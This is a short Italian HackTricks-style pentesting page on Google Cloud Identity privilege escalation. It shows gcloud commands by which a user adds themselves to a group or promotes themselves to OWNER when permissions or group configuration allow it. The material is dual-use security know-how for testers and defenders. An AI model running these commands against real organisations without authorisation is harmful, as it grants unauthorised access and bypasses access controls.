# GCP - Cloudidentity Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Cloudidentity

Per maggiori informazioni sul servizio cloudidentity, consulta questa pagina:

{{#ref}}
../gcp-services/gcp-iam-and-org-policies-enum.md
{{#endref}}

### Aggiungiti a un gruppo

Se il tuo utente ha permessi sufficienti o il gruppo è mal configurato, potrebbe essere in grado di aggiungere se stesso come membro di un nuovo gruppo:

<details><summary>Aggiungiti a un gruppo Cloud Identity</summary>
```bash
gcloud identity groups memberships add --group-email <email> --member-email <email> [--roles OWNER]
# If --roles isn't specified you will get MEMBER
```
</details>

### Modificare l'appartenenza al gruppo

Se il tuo utente ha permessi sufficienti o il gruppo è mal configurato, potrebbe riuscire a rendersi OWNER di un gruppo di cui è membro:

<details><summary>Modificare l'appartenenza al gruppo per diventare OWNER</summary>
```bash
# Check the current membership level
gcloud identity groups memberships describe --member-email <email> --group-email <email>

# If not OWNER try
gcloud identity groups memberships modify-membership-roles --group-email <email> --member-email <email> --add-roles=OWNER
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
